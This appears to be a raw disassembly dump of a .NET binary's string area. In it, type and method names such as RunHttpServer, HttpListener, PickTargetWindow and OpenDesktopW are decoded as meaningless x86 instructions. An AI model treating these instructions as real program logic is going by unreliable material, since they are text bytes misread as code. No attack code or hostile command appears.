  40525a:	4c                   	dec    %esp
  40525b:	69 73 74 60 31 00 6c 	imul   $0x6c003160,0x74(%ebx),%esi
  405262:	69 73 74 00 3c 50 69 	imul   $0x69503c00,0x74(%ebx),%esi
  405269:	63 6b 54             	arpl   %ebp,0x54(%ebx)
  40526c:	61                   	popa
  40526d:	72 67                	jb     0x4052d6
  40526f:	65 74 57             	gs je  0x4052c9
  405272:	69 6e 64 6f 77 3e 62 	imul   $0x623e776f,0x64(%esi),%ebp
  405279:	5f                   	pop    %edi
  40527a:	5f                   	pop    %edi
  40527b:	38 00                	cmp    %al,(%eax)
  40527d:	6c                   	insb   (%dx),%es:(%edi)
  40527e:	00 67 65             	add    %ah,0x65(%edi)
  405281:	74 5f                	je     0x4052e2
  405283:	43                   	inc    %ebx
  405284:	61                   	popa
  405285:	70 61                	jo     0x4052e8
  405287:	63 69 74             	arpl   %ebp,0x74(%ecx)
  40528a:	79 00                	jns    0x40528c
  40528c:	54                   	push   %esp
  40528d:	6f                   	outsl  %ds:(%esi),(%dx)
  40528e:	53                   	push   %ebx
  40528f:	74 72                	je     0x405303
  405291:	69 6e 67 00 41 64 64 	imul   $0x64644100,0x67(%esi),%ebp
  405298:	00 45 6e             	add    %al,0x6e(%ebp)
  40529b:	75 6d                	jne    0x40530a
  40529d:	65 72 61             	gs jb  0x405301
  4052a0:	74 6f                	je     0x405311
  4052a2:	72 00                	jb     0x4052a4
  4052a4:	47                   	inc    %edi
  4052a5:	65 74 45             	gs je  0x4052ed
  4052a8:	6e                   	outsb  %ds:(%esi),(%dx)
  4052a9:	75 6d                	jne    0x405318
  4052ab:	65 72 61             	gs jb  0x40530f
  4052ae:	74 6f                	je     0x40531f
  4052b0:	72 00                	jb     0x4052b2
  4052b2:	67 65 74 5f          	addr16 gs je 0x405315
  4052b6:	43                   	inc    %ebx
  4052b7:	75 72                	jne    0x40532b
  4052b9:	72 65                	jb     0x405320
  4052bb:	6e                   	outsb  %ds:(%esi),(%dx)
  4052bc:	74 00                	je     0x4052be
  4052be:	4d                   	dec    %ebp
  4052bf:	6f                   	outsl  %ds:(%esi),(%dx)
  4052c0:	76 65                	jbe    0x405327
  4052c2:	4e                   	dec    %esi
  4052c3:	65 78 74             	gs js  0x40533a
  4052c6:	00 3c 3e             	add    %bh,(%esi,%edi,1)
  4052c9:	63 5f 5f             	arpl   %ebx,0x5f(%edi)
  4052cc:	44                   	inc    %esp
  4052cd:	69 73 70 6c 61 79 43 	imul   $0x4379616c,0x70(%ebx),%esi
  4052d4:	6c                   	insb   (%dx),%es:(%edi)
  4052d5:	61                   	popa
  4052d6:	73 73                	jae    0x40534b
  4052d8:	63 00                	arpl   %eax,(%eax)
  4052da:	3c 52                	cmp    $0x52,%al
  4052dc:	75 6e                	jne    0x40534c
  4052de:	48                   	dec    %eax
  4052df:	74 74                	je     0x405355
  4052e1:	70 53                	jo     0x405336
  4052e3:	65 72 76             	gs jb  0x40535c
  4052e6:	65 72 3e             	gs jb  0x405327
  4052e9:	62 5f 5f             	bound  %ebx,0x5f(%edi)
  4052ec:	62 00                	bound  %eax,(%eax)
  4052ee:	70 61                	jo     0x405351
  4052f0:	72 61                	jb     0x405353
  4052f2:	6d                   	insl   (%dx),%es:(%edi)
  4052f3:	30 00                	xor    %al,(%eax)
  4052f5:	48                   	dec    %eax
  4052f6:	74 74                	je     0x40536c
  4052f8:	70 4c                	jo     0x405346
  4052fa:	69 73 74 65 6e 65 72 	imul   $0x72656e65,0x74(%ebx),%esi
  405301:	00 48 74             	add    %cl,0x74(%eax)
  405304:	74 70                	je     0x405376
  405306:	4c                   	dec    %esp
  405307:	69 73 74 65 6e 65 72 	imul   $0x72656e65,0x74(%ebx),%esi
  40530e:	50                   	push   %eax
  40530f:	72 65                	jb     0x405376
  405311:	66 69 78 43 6f 6c    	imul   $0x6c6f,0x43(%eax),%di
  405317:	6c                   	insb   (%dx),%es:(%edi)
  405318:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  40531d:	6e                   	outsb  %ds:(%esi),(%dx)
  40531e:	00 67 65             	add    %ah,0x65(%edi)
  405321:	74 5f                	je     0x405382
  405323:	50                   	push   %eax
  405324:	72 65                	jb     0x40538b
  405326:	66 69 78 65 73 00    	imul   $0x73,0x65(%eax),%di
  40532c:	47                   	inc    %edi
  40532d:	65 74 43             	gs je  0x405373
  405330:	6f                   	outsl  %ds:(%esi),(%dx)
  405331:	6e                   	outsb  %ds:(%esi),(%dx)
  405332:	74 65                	je     0x405399
  405334:	78 74                	js     0x4053aa
  405336:	00 57 61             	add    %dl,0x61(%edi)
  405339:	69 74 43 61 6c 6c 62 	imul   $0x61626c6c,0x61(%ebx,%eax,2),%esi
  405340:	61 
  405341:	63 6b 00             	arpl   %ebp,0x0(%ebx)
  405344:	54                   	push   %esp
  405345:	68 72 65 61 64       	push   $0x64616572
  40534a:	50                   	push   %eax
  40534b:	6f                   	outsl  %ds:(%esi),(%dx)
  40534c:	6f                   	outsl  %ds:(%esi),(%dx)
  40534d:	6c                   	insb   (%dx),%es:(%edi)
  40534e:	00 51 75             	add    %dl,0x75(%ecx)
  405351:	65 75 65             	gs jne 0x4053b9
  405354:	55                   	push   %ebp
  405355:	73 65                	jae    0x4053bc
  405357:	72 57                	jb     0x4053b0
  405359:	6f                   	outsl  %ds:(%esi),(%dx)
  40535a:	72 6b                	jb     0x4053c7
  40535c:	49                   	dec    %ecx
  40535d:	74 65                	je     0x4053c4
  40535f:	6d                   	insl   (%dx),%es:(%edi)
  405360:	00 43 6c             	add    %al,0x6c(%ebx)
  405363:	6f                   	outsl  %ds:(%esi),(%dx)
  405364:	73 65                	jae    0x4053cb
  405366:	00 48 74             	add    %cl,0x74(%eax)
  405369:	74 70                	je     0x4053db
  40536b:	4c                   	dec    %esp
  40536c:	69 73 74 65 6e 65 72 	imul   $0x72656e65,0x74(%ebx),%esi
  405373:	45                   	inc    %ebp
  405374:	78 63                	js     0x4053d9
  405376:	65 70 74             	gs jo  0x4053ed
  405379:	69 6f 6e 00 4f 62 6a 	imul   $0x6a624f00,0x6e(%edi),%ebp
  405380:	65 63 74 44 69       	arpl   %esi,%gs:0x69(%esp,%eax,2)
  405385:	73 70                	jae    0x4053f7
  405387:	6f                   	outsl  %ds:(%esi),(%dx)
  405388:	73 65                	jae    0x4053ef
  40538a:	64 45                	fs inc %ebp
  40538c:	78 63                	js     0x4053f1
  40538e:	65 70 74             	gs jo  0x405405
  405391:	69 6f 6e 00 48 74 74 	imul   $0x74744800,0x6e(%edi),%ebp
  405398:	70 4c                	jo     0x4053e6
  40539a:	69 73 74 65 6e 65 72 	imul   $0x72656e65,0x74(%ebx),%esi
  4053a1:	52                   	push   %edx
  4053a2:	65 71 75             	gs jno 0x40541a
  4053a5:	65 73 74             	gs jae 0x40541c
  4053a8:	00 67 65             	add    %ah,0x65(%edi)
  4053ab:	74 5f                	je     0x40540c
  4053ad:	52                   	push   %edx
  4053ae:	65 71 75             	gs jno 0x405426
  4053b1:	65 73 74             	gs jae 0x405428
  4053b4:	00 55 72             	add    %dl,0x72(%ebp)
  4053b7:	69 00 67 65 74 5f    	imul   $0x5f746567,(%eax),%eax
  4053bd:	55                   	push   %ebp
  4053be:	72 6c                	jb     0x40542c
  4053c0:	00 67 65             	add    %ah,0x65(%edi)
  4053c3:	74 5f                	je     0x405424
  4053c5:	41                   	inc    %ecx
  4053c6:	62 73 6f             	bound  %esi,0x6f(%ebx)
  4053c9:	6c                   	insb   (%dx),%es:(%edi)
  4053ca:	75 74                	jne    0x405440
  4053cc:	65 50                	gs push %eax
  4053ce:	61                   	popa
  4053cf:	74 68                	je     0x405439
  4053d1:	00 67 65             	add    %ah,0x65(%edi)
  4053d4:	74 5f                	je     0x405435
  4053d6:	48                   	dec    %eax
  4053d7:	74 74                	je     0x40544d
  4053d9:	70 4d                	jo     0x405428
  4053db:	65 74 68             	gs je  0x405446
  4053de:	6f                   	outsl  %ds:(%esi),(%dx)
  4053df:	64 00 45 6e          	add    %al,%fs:0x6e(%ebp)
  4053e3:	63 6f 64             	arpl   %ebp,0x64(%edi)
  4053e6:	69 6e 67 00 67 65 74 	imul   $0x74656700,0x67(%esi),%ebp
  4053ed:	5f                   	pop    %edi
  4053ee:	55                   	push   %ebp
  4053ef:	54                   	push   %esp
  4053f0:	46                   	inc    %esi
  4053f1:	38 00                	cmp    %al,(%eax)
  4053f3:	47                   	inc    %edi
  4053f4:	65 74 42             	gs je  0x405439
  4053f7:	79 74                	jns    0x40546d
  4053f9:	65 73 00             	gs jae 0x4053fc
  4053fc:	48                   	dec    %eax
  4053fd:	74 74                	je     0x405473
  4053ff:	70 4c                	jo     0x40544d
  405401:	69 73 74 65 6e 65 72 	imul   $0x72656e65,0x74(%ebx),%esi
  405408:	52                   	push   %edx
  405409:	65 73 70             	gs jae 0x40547c
  40540c:	6f                   	outsl  %ds:(%esi),(%dx)
  40540d:	6e                   	outsb  %ds:(%esi),(%dx)
  40540e:	73 65                	jae    0x405475
  405410:	00 67 65             	add    %ah,0x65(%edi)
  405413:	74 5f                	je     0x405474
  405415:	52                   	push   %edx
  405416:	65 73 70             	gs jae 0x405489
  405419:	6f                   	outsl  %ds:(%esi),(%dx)
  40541a:	6e                   	outsb  %ds:(%esi),(%dx)
  40541b:	73 65                	jae    0x405482
  40541d:	00 73 65             	add    %dh,0x65(%ebx)
  405420:	74 5f                	je     0x405481
  405422:	53                   	push   %ebx
  405423:	74 61                	je     0x405486
  405425:	74 75                	je     0x40549c
  405427:	73 43                	jae    0x40546c
  405429:	6f                   	outsl  %ds:(%esi),(%dx)
  40542a:	64 65 00 73 65       	fs add %dh,%gs:0x65(%ebx)
  40542f:	74 5f                	je     0x405490
  405431:	43                   	inc    %ebx
  405432:	6f                   	outsl  %ds:(%esi),(%dx)
  405433:	6e                   	outsb  %ds:(%esi),(%dx)
  405434:	74 65                	je     0x40549b
  405436:	6e                   	outsb  %ds:(%esi),(%dx)
  405437:	74 54                	je     0x40548d
  405439:	79 70                	jns    0x4054ab
  40543b:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  40543f:	74 5f                	je     0x4054a0
  405441:	43                   	inc    %ebx
  405442:	6f                   	outsl  %ds:(%esi),(%dx)
  405443:	6e                   	outsb  %ds:(%esi),(%dx)
  405444:	74 65                	je     0x4054ab
  405446:	6e                   	outsb  %ds:(%esi),(%dx)
  405447:	74 4c                	je     0x405495
  405449:	65 6e                	outsb  %gs:(%esi),(%dx)
  40544b:	67 74 68             	addr16 je 0x4054b6
  40544e:	36 34 00             	ss xor $0x0,%al
  405451:	53                   	push   %ebx
  405452:	79 73                	jns    0x4054c7
  405454:	74 65                	je     0x4054bb
  405456:	6d                   	insl   (%dx),%es:(%edi)
  405457:	2e 49                	cs dec %ecx
  405459:	4f                   	dec    %edi
  40545a:	00 53 74             	add    %dl,0x74(%ebx)
  40545d:	72 65                	jb     0x4054c4
  40545f:	61                   	popa
  405460:	6d                   	insl   (%dx),%es:(%edi)
  405461:	00 67 65             	add    %ah,0x65(%edi)
  405464:	74 5f                	je     0x4054c5
  405466:	4f                   	dec    %edi
  405467:	75 74                	jne    0x4054dd
  405469:	70 75                	jo     0x4054e0
  40546b:	74 53                	je     0x4054c0
  40546d:	74 72                	je     0x4054e1
  40546f:	65 61                	gs popa
  405471:	6d                   	insl   (%dx),%es:(%edi)
  405472:	00 57 72             	add    %dl,0x72(%edi)
  405475:	69 74 65 00 67 65 74 	imul   $0x5f746567,0x0(%ebp,%eiz,2),%esi
  40547c:	5f 
  40547d:	49                   	dec    %ecx
  40547e:	6e                   	outsb  %ds:(%esi),(%dx)
  40547f:	70 75                	jo     0x4054f6
  405481:	74 53                	je     0x4054d6
  405483:	74 72                	je     0x4054f7
  405485:	65 61                	gs popa
  405487:	6d                   	insl   (%dx),%es:(%edi)
  405488:	00 67 65             	add    %ah,0x65(%edi)
  40548b:	74 5f                	je     0x4054ec
  40548d:	43                   	inc    %ebx
  40548e:	6f                   	outsl  %ds:(%esi),(%dx)
  40548f:	6e                   	outsb  %ds:(%esi),(%dx)
  405490:	74 65                	je     0x4054f7
  405492:	6e                   	outsb  %ds:(%esi),(%dx)
  405493:	74 45                	je     0x4054da
  405495:	6e                   	outsb  %ds:(%esi),(%dx)
  405496:	63 6f 64             	arpl   %ebp,0x64(%edi)
  405499:	69 6e 67 00 53 74 72 	imul   $0x72745300,0x67(%esi),%ebp
  4054a0:	65 61                	gs popa
  4054a2:	6d                   	insl   (%dx),%es:(%edi)
  4054a3:	52                   	push   %edx
  4054a4:	65 61                	gs popa
  4054a6:	64 65 72 00          	fs gs jb 0x4054aa
  4054aa:	54                   	push   %esp
  4054ab:	65 78 74             	gs js  0x405522
  4054ae:	52                   	push   %edx
  4054af:	65 61                	gs popa
  4054b1:	64 65 72 00          	fs gs jb 0x4054b5
  4054b5:	52                   	push   %edx
  4054b6:	65 61                	gs popa
  4054b8:	64 54                	fs push %esp
  4054ba:	6f                   	outsl  %ds:(%esi),(%dx)
  4054bb:	45                   	inc    %ebp
  4054bc:	6e                   	outsb  %ds:(%esi),(%dx)
  4054bd:	64 00 73 65          	add    %dh,%fs:0x65(%ebx)
  4054c1:	74 5f                	je     0x405522
  4054c3:	53                   	push   %ebx
  4054c4:	65 6e                	outsb  %gs:(%esi),(%dx)
  4054c6:	64 43                	fs inc %ebx
  4054c8:	68 75 6e 6b 65       	push   $0x656b6e75
  4054cd:	64 00 57 65          	add    %dl,%fs:0x65(%edi)
  4054d1:	62 48 65             	bound  %ecx,0x65(%eax)
  4054d4:	61                   	popa
  4054d5:	64 65 72 43          	fs gs jb 0x40551c
  4054d9:	6f                   	outsl  %ds:(%esi),(%dx)
  4054da:	6c                   	insb   (%dx),%es:(%edi)
  4054db:	6c                   	insb   (%dx),%es:(%edi)
  4054dc:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4054e1:	6e                   	outsb  %ds:(%esi),(%dx)
  4054e2:	00 67 65             	add    %ah,0x65(%edi)
  4054e5:	74 5f                	je     0x405546
  4054e7:	48                   	dec    %eax
  4054e8:	65 61                	gs popa
  4054ea:	64 65 72 73          	fs gs jb 0x405561
  4054ee:	00 53 79             	add    %dl,0x79(%ebx)
  4054f1:	73 74                	jae    0x405567
  4054f3:	65 6d                	gs insl (%dx),%es:(%edi)
  4054f5:	2e 43                	cs inc %ebx
  4054f7:	6f                   	outsl  %ds:(%esi),(%dx)
  4054f8:	6c                   	insb   (%dx),%es:(%edi)
  4054f9:	6c                   	insb   (%dx),%es:(%edi)
  4054fa:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4054ff:	6e                   	outsb  %ds:(%esi),(%dx)
  405500:	73 2e                	jae    0x405530
  405502:	53                   	push   %ebx
  405503:	70 65                	jo     0x40556a
  405505:	63 69 61             	arpl   %ebp,0x61(%ecx)
  405508:	6c                   	insb   (%dx),%es:(%edi)
  405509:	69 7a 65 64 00 4e 61 	imul   $0x614e0064,0x65(%edx),%edi
  405510:	6d                   	insl   (%dx),%es:(%edi)
  405511:	65 56                	gs push %esi
  405513:	61                   	popa
  405514:	6c                   	insb   (%dx),%es:(%edi)
  405515:	75 65                	jne    0x40557c
  405517:	43                   	inc    %ebx
  405518:	6f                   	outsl  %ds:(%esi),(%dx)
  405519:	6c                   	insb   (%dx),%es:(%edi)
  40551a:	6c                   	insb   (%dx),%es:(%edi)
  40551b:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  405520:	6e                   	outsb  %ds:(%esi),(%dx)
  405521:	00 52 65             	add    %dl,0x65(%edx)
  405524:	66 65 72 65          	data16 gs jb 0x40558d
  405528:	6e                   	outsb  %ds:(%esi),(%dx)
  405529:	63 65 45             	arpl   %esp,0x45(%ebp)
  40552c:	71 75                	jno    0x4055a3
  40552e:	61                   	popa
  40552f:	6c                   	insb   (%dx),%es:(%edi)
  405530:	73 00                	jae    0x405532
  405532:	67 65 74 5f          	addr16 gs je 0x405595
  405536:	41                   	inc    %ecx
  405537:	53                   	push   %ebx
  405538:	43                   	inc    %ebx
  405539:	49                   	dec    %ecx
  40553a:	49                   	dec    %ecx
  40553b:	00 57 72             	add    %dl,0x72(%edi)
  40553e:	69 74 65 42 79 74 65 	imul   $0x657479,0x42(%ebp,%eiz,2),%esi
  405545:	00 
  405546:	46                   	inc    %esi
  405547:	6c                   	insb   (%dx),%es:(%edi)
  405548:	75 73                	jne    0x4055bd
  40554a:	68 00 49 73 4e       	push   $0x4e734900
  40554f:	75 6c                	jne    0x4055bd
  405551:	6c                   	insb   (%dx),%es:(%edi)
  405552:	4f                   	dec    %edi
  405553:	72 45                	jb     0x40559a
  405555:	6d                   	insl   (%dx),%es:(%edi)
  405556:	70 74                	jo     0x4055cc
  405558:	79 00                	jns    0x40555a
  40555a:	3c 50                	cmp    $0x50,%al
  40555c:	72 69                	jb     0x4055c7
  40555e:	76 61                	jbe    0x4055c1
  405560:	74 65                	je     0x4055c7
  405562:	49                   	dec    %ecx
  405563:	6d                   	insl   (%dx),%es:(%edi)
  405564:	70 6c                	jo     0x4055d2
  405566:	65 6d                	gs insl (%dx),%es:(%edi)
  405568:	65 6e                	outsb  %gs:(%esi),(%dx)
  40556a:	74 61                	je     0x4055cd
  40556c:	74 69                	je     0x4055d7
  40556e:	6f                   	outsl  %ds:(%esi),(%dx)
  40556f:	6e                   	outsb  %ds:(%esi),(%dx)
  405570:	44                   	inc    %esp
  405571:	65 74 61             	gs je  0x4055d5
  405574:	69 6c 73 3e 7b 31 41 	imul   $0x4341317b,0x3e(%ebx,%esi,2),%ebp
  40557b:	43 
  40557c:	37                   	aaa
  40557d:	41                   	inc    %ecx
  40557e:	37                   	aaa
  40557f:	37                   	aaa
  405580:	44                   	inc    %esp
  405581:	2d 37 42 41 37       	sub    $0x37414237,%eax
  405586:	2d 34 39 41 45       	sub    $0x45413934,%eax
  40558b:	2d 41 39 38 36       	sub    $0x36383941,%eax
  405590:	2d 41 45 34 45       	sub    $0x45344541,%eax
  405595:	34 46                	xor    $0x46,%al
  405597:	41                   	inc    %ecx
  405598:	43                   	inc    %ebx
  405599:	32 37                	xor    (%edi),%dh
  40559b:	35 44 7d 00 44       	xor    $0x44007d44,%eax
  4055a0:	69 63 74 69 6f 6e 61 	imul   $0x616e6f69,0x74(%ebx),%esp
  4055a7:	72 79                	jb     0x405622
  4055a9:	60                   	pusha
  4055aa:	32 00                	xor    (%eax),%al
  4055ac:	24 24                	and    $0x24,%al
  4055ae:	6d                   	insl   (%dx),%es:(%edi)
  4055af:	65 74 68             	gs je  0x40561a
  4055b2:	6f                   	outsl  %ds:(%esi),(%dx)
  4055b3:	64 30 78 36          	xor    %bh,%fs:0x36(%eax)
  4055b7:	30 30                	xor    %dh,(%eax)
  4055b9:	30 30                	xor    %dh,(%eax)
  4055bb:	30 38                	xor    %bh,(%eax)
  4055bd:	2d 31 00 54 72       	sub    $0x72540031,%eax
  4055c2:	79 47                	jns    0x40560b
  4055c4:	65 74 56             	gs je  0x40561d
  4055c7:	61                   	popa
  4055c8:	6c                   	insb   (%dx),%es:(%edi)
  4055c9:	75 65                	jne    0x405630
  4055cb:	00 67 65             	add    %ah,0x65(%edi)
  4055ce:	74 5f                	je     0x40562f
  4055d0:	43                   	inc    %ebx
  4055d1:	68 61 72 73 00       	push   $0x737261
  4055d6:	3c 3e                	cmp    $0x3e,%al
  4055d8:	63 5f 5f             	arpl   %ebx,0x5f(%edi)
  4055db:	44                   	inc    %esp
  4055dc:	69 73 70 6c 61 79 43 	imul   $0x4379616c,0x70(%ebx),%esi
  4055e3:	6c                   	insb   (%dx),%es:(%edi)
  4055e4:	61                   	popa
  4055e5:	73 73                	jae    0x40565a
  4055e7:	31 34 00             	xor    %esi,(%eax,%eax,1)
  4055ea:	3c 42                	cmp    $0x42,%al
  4055ec:	75 69                	jne    0x405657
  4055ee:	6c                   	insb   (%dx),%es:(%edi)
  4055ef:	64 57                	fs push %edi
  4055f1:	69 6e 64 6f 77 73 4a 	imul   $0x4a73776f,0x64(%esi),%ebp
  4055f8:	73 6f                	jae    0x405669
  4055fa:	6e                   	outsb  %ds:(%esi),(%dx)
  4055fb:	3e 62 5f 5f          	bound  %ebx,%ds:0x5f(%edi)
  4055ff:	31 32                	xor    %esi,(%edx)
  405601:	00 41 70             	add    %al,0x70(%ecx)
  405604:	70 65                	jo     0x40566b
  405606:	6e                   	outsb  %ds:(%esi),(%dx)
  405607:	64 00 53 79          	add    %dl,%fs:0x79(%ebx)
  40560b:	73 74                	jae    0x405681
  40560d:	65 6d                	gs insl (%dx),%es:(%edi)
  40560f:	2e 47                	cs inc %edi
  405611:	6c                   	insb   (%dx),%es:(%edi)
  405612:	6f                   	outsl  %ds:(%esi),(%dx)
  405613:	62 61 6c             	bound  %esp,0x6c(%ecx)
  405616:	69 7a 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%edx),%edi
  40561d:	00 43 75             	add    %al,0x75(%ebx)
  405620:	6c                   	insb   (%dx),%es:(%edi)
  405621:	74 75                	je     0x405698
  405623:	72 65                	jb     0x40568a
  405625:	49                   	dec    %ecx
  405626:	6e                   	outsb  %ds:(%esi),(%dx)
  405627:	66 6f                	outsw  %ds:(%esi),(%dx)
  405629:	00 67 65             	add    %ah,0x65(%edi)
  40562c:	74 5f                	je     0x40568d
  40562e:	49                   	dec    %ecx
  40562f:	6e                   	outsb  %ds:(%esi),(%dx)
  405630:	76 61                	jbe    0x405693
  405632:	72 69                	jb     0x40569d
  405634:	61                   	popa
  405635:	6e                   	outsb  %ds:(%esi),(%dx)
  405636:	74 43                	je     0x40567b
  405638:	75 6c                	jne    0x4056a6
  40563a:	74 75                	je     0x4056b1
  40563c:	72 65                	jb     0x4056a3
  40563e:	00 44 6f 75          	add    %al,0x75(%edi,%ebp,2)
  405642:	62 6c 65 00          	bound  %ebp,0x0(%ebp,%eiz,2)
  405646:	49                   	dec    %ecx
  405647:	46                   	inc    %esi
  405648:	6f                   	outsl  %ds:(%esi),(%dx)
  405649:	72 6d                	jb     0x4056b8
  40564b:	61                   	popa
  40564c:	74 50                	je     0x40569e
  40564e:	72 6f                	jb     0x4056bf
  405650:	76 69                	jbe    0x4056bb
  405652:	64 65 72 00          	fs gs jb 0x405656
  405656:	67 65 74 5f          	addr16 gs je 0x4056b9
  40565a:	49                   	dec    %ecx
  40565b:	74 65                	je     0x4056c2
  40565d:	6d                   	insl   (%dx),%es:(%edi)
  40565e:	00 67 65             	add    %ah,0x65(%edi)
  405661:	74 5f                	je     0x4056c2
  405663:	43                   	inc    %ebx
  405664:	6f                   	outsl  %ds:(%esi),(%dx)
  405665:	75 6e                	jne    0x4056d5
  405667:	74 00                	je     0x405669
  405669:	4d                   	dec    %ebp
  40566a:	65 6d                	gs insl (%dx),%es:(%edi)
  40566c:	6f                   	outsl  %ds:(%esi),(%dx)
  40566d:	72 79                	jb     0x4056e8
  40566f:	53                   	push   %ebx
  405670:	74 72                	je     0x4056e4
  405672:	65 61                	gs popa
  405674:	6d                   	insl   (%dx),%es:(%edi)
  405675:	00 45 6e             	add    %al,0x6e(%ebp)
  405678:	63 6f 64             	arpl   %ebp,0x64(%edi)
  40567b:	65 72 50             	gs jb  0x4056ce
  40567e:	61                   	popa
  40567f:	72 61                	jb     0x4056e2
  405681:	6d                   	insl   (%dx),%es:(%edi)
  405682:	65 74 65             	gs je  0x4056ea
  405685:	72 73                	jb     0x4056fa
  405687:	00 45 6e             	add    %al,0x6e(%ebp)
  40568a:	63 6f 64             	arpl   %ebp,0x64(%edi)
  40568d:	65 72 50             	gs jb  0x4056e0
  405690:	61                   	popa
  405691:	72 61                	jb     0x4056f4
  405693:	6d                   	insl   (%dx),%es:(%edi)
  405694:	65 74 65             	gs je  0x4056fc
  405697:	72 00                	jb     0x405699
  405699:	67 65 74 5f          	addr16 gs je 0x4056fc
  40569d:	50                   	push   %eax
  40569e:	61                   	popa
  40569f:	72 61                	jb     0x405702
  4056a1:	6d                   	insl   (%dx),%es:(%edi)
  4056a2:	00 45 6e             	add    %al,0x6e(%ebp)
  4056a5:	63 6f 64             	arpl   %ebp,0x64(%edi)
  4056a8:	65 72 00             	gs jb  0x4056ab
  4056ab:	51                   	push   %ecx
  4056ac:	75 61                	jne    0x40570f
  4056ae:	6c                   	insb   (%dx),%es:(%edi)
  4056af:	69 74 79 00 53 61 76 	imul   $0x65766153,0x0(%ecx,%edi,2),%esi
  4056b6:	65 
  4056b7:	00 54 6f 41          	add    %dl,0x41(%edi,%ebp,2)
  4056bb:	72 72                	jb     0x40572f
  4056bd:	61                   	popa
  4056be:	79 00                	jns    0x4056c0
  4056c0:	47                   	inc    %edi
  4056c1:	65 74 49             	gs je  0x40570d
  4056c4:	6d                   	insl   (%dx),%es:(%edi)
  4056c5:	61                   	popa
  4056c6:	67 65 45             	addr16 gs inc %ebp
  4056c9:	6e                   	outsb  %ds:(%esi),(%dx)
  4056ca:	63 6f 64             	arpl   %ebp,0x64(%edi)
  4056cd:	65 72 73             	gs jb  0x405743
  4056d0:	00 67 65             	add    %ah,0x65(%edi)
  4056d3:	74 5f                	je     0x405734
  4056d5:	4d                   	dec    %ebp
  4056d6:	69 6d 65 54 79 70 65 	imul   $0x65707954,0x65(%ebp),%ebp
  4056dd:	00 53 74             	add    %dl,0x74(%ebx)
  4056e0:	72 69                	jb     0x40574b
  4056e2:	6e                   	outsb  %ds:(%esi),(%dx)
  4056e3:	67 43                	addr16 inc %ebx
  4056e5:	6f                   	outsl  %ds:(%esi),(%dx)
  4056e6:	6d                   	insl   (%dx),%es:(%edi)
  4056e7:	70 61                	jo     0x40574a
  4056e9:	72 69                	jb     0x405754
  4056eb:	73 6f                	jae    0x40575c
  4056ed:	6e                   	outsb  %ds:(%esi),(%dx)
  4056ee:	00 45 71             	add    %al,0x71(%ebp)
  4056f1:	75 61                	jne    0x405754
  4056f3:	6c                   	insb   (%dx),%es:(%edi)
  4056f4:	73 00                	jae    0x4056f6
  4056f6:	49                   	dec    %ecx
  4056f7:	6e                   	outsb  %ds:(%esi),(%dx)
  4056f8:	64 65 78 4f          	fs gs js 0x40574b
  4056fc:	66 00 67 65          	data16 add %ah,0x65(%edi)
  405700:	74 5f                	je     0x405761
  405702:	4c                   	dec    %esp
  405703:	65 6e                	outsb  %gs:(%esi),(%dx)
  405705:	67 74 68             	addr16 je 0x405770
  405708:	00 43 68             	add    %al,0x68(%ebx)
  40570b:	61                   	popa
  40570c:	72 00                	jb     0x40570e
  40570e:	49                   	dec    %ecx
  40570f:	73 57                	jae    0x405768
  405711:	68 69 74 65 53       	push   $0x53657469
  405716:	70 61                	jo     0x405779
  405718:	63 65 00             	arpl   %esp,0x0(%ebp)
  40571b:	49                   	dec    %ecx
  40571c:	73 44                	jae    0x405762
  40571e:	69 67 69 74 00 53 75 	imul   $0x75530074,0x69(%edi),%esp
  405725:	62 73 74             	bound  %esi,0x74(%ebx)
  405728:	72 69                	jb     0x405793
  40572a:	6e                   	outsb  %ds:(%esi),(%dx)
  40572b:	67 00 4e 75          	add    %cl,0x75(%bp)
  40572f:	6d                   	insl   (%dx),%es:(%edi)
  405730:	62 65 72             	bound  %esp,0x72(%ebp)
  405733:	53                   	push   %ebx
  405734:	74 79                	je     0x4057af
  405736:	6c                   	insb   (%dx),%es:(%edi)
  405737:	65 73 00             	gs jae 0x40573a
  40573a:	52                   	push   %edx
  40573b:	6f                   	outsl  %ds:(%esi),(%dx)
  40573c:	75 6e                	jne    0x4057ac
  40573e:	64 00 45 6d          	add    %al,%fs:0x6d(%ebp)
  405742:	70 74                	jo     0x4057b8
  405744:	79 00                	jns    0x405746
  405746:	2e 63 63 74          	arpl   %esp,%cs:0x74(%ebx)
  40574a:	6f                   	outsl  %ds:(%esi),(%dx)
  40574b:	72 00                	jb     0x40574d
  40574d:	42                   	inc    %edx
  40574e:	79 74                	jns    0x4057c4
  405750:	65 00 44 6c 6c       	add    %al,%gs:0x6c(%esp,%ebp,2)
  405755:	49                   	dec    %ecx
  405756:	6d                   	insl   (%dx),%es:(%edi)
  405757:	70 6f                	jo     0x4057c8
  405759:	72 74                	jb     0x4057cf
  40575b:	41                   	inc    %ecx
  40575c:	74 74                	je     0x4057d2
  40575e:	72 69                	jb     0x4057c9
  405760:	62 75 74             	bound  %esi,0x74(%ebp)
  405763:	65 00 75 73          	add    %dh,%gs:0x73(%ebp)
  405767:	65 72 33             	gs jb  0x40579d
  40576a:	32 2e                	xor    (%esi),%ch
  40576c:	64 6c                	fs insb (%dx),%es:(%edi)
  40576e:	6c                   	insb   (%dx),%es:(%edi)
  40576f:	00 4f 70             	add    %cl,0x70(%edi)
  405772:	65 6e                	outsb  %gs:(%esi),(%dx)
  405774:	44                   	inc    %esp
  405775:	65 73 6b             	gs jae 0x4057e3
  405778:	74 6f                	je     0x4057e9
  40577a:	70 57                	jo     0x4057d3
  40577c:	00 53 74             	add    %dl,0x74(%ebx)
  40577f:	72 75                	jb     0x4057f6
  405781:	63 74 4c 61          	arpl   %esi,0x61(%esp,%ecx,2)
  405785:	79 6f                	jns    0x4057f6
  405787:	75 74                	jne    0x4057fd
  405789:	41                   	inc    %ecx
  40578a:	74 74                	je     0x405800
  40578c:	72 69                	jb     0x4057f7
  40578e:	62 75 74             	bound  %esi,0x74(%ebp)
  405791:	65 00 4c 61 79       	add    %cl,%gs:0x79(%ecx,%eiz,2)
  405796:	6f                   	outsl  %ds:(%esi),(%dx)
  405797:	75 74                	jne    0x40580d
  405799:	4b                   	dec    %ebx
  40579a:	69 6e 64 00 00 00 00 	imul   $0x0,0x64(%esi),%ebp
